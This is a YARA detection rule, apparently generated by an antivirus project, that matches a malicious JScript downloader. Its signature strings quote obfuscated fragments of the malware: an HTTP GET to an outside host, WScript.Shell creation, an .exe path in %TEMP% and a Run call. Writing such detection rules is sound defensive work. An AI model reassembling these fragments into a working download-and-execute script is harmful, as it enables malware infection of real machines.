rule sig_20160401_dfddeb8d3facc566489399dcc7550186 {
  meta:
    description = "datamaliciousorder - file 20160401_dfddeb8d3facc566489399dcc7550186.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f5010cb15dc3025939fff9e9c76df05b225c67e2fe995d2482b3956c5e322c97"

  strings:
    $s1  = "HyVo[RtDq](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/p2iskd\", false);" fullword ascii
    $s2  = "var ZrmBkf = function UciQfd() {return WScript[VbmSn](\"WScript\"+\".Shell\");}(), RvoLs = 11;" fullword ascii
    $s3  = "function VyyXi(CsYz, YkBo){LbGu = LbGu * 1; return CsYz - YkBo;};" fullword ascii
    $s4  = "if (HyVo[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OfsEex(){return QbDcz + \"\";};" fullword ascii
    $s6  = "function VoiXdo() {return ZrmBkf[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"sMxdMCBbfFT.ex\" + \"e\";};" fullword ascii
    $s7  = "function HcuMm() {return ((TbYl == true) && (TbYl == XylPxj)) ? 1 : LbGu;};" fullword ascii
    $s8  = "var HiFm = false;" fullword ascii
    $s9  = "function FuuLgz(){return 23;};" fullword ascii
    $s10 = "TbYl = true; " fullword ascii
    $s11 = "function QdLga(){return VbmSn;};" fullword ascii
    $s12 = "function LdpLk(RndGwo){ZrmBkf[\"R\"+\"un\"](RndGwo, LbGu, LbGu);};" fullword ascii
    $s13 = "var TbYl = false;" fullword ascii
    $s14 = "var QhVm = new this[\"Date\"]();" fullword ascii
    $s15 = "function XbJuu()" fullword ascii
    $s16 = "return VyyXi(DoFvs, YfyAem);" fullword ascii
    $s17 = "function WrhKf(MtjUtb) {var OgeSc = (1, 2, 3, 4, 5, MtjUtb); return OgeSc;};" fullword ascii
    $s18 = "var XylPxj = false;" fullword ascii
    $s19 = "XylPxj = true; " fullword ascii
    $s20 = "}while (JpbZe);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}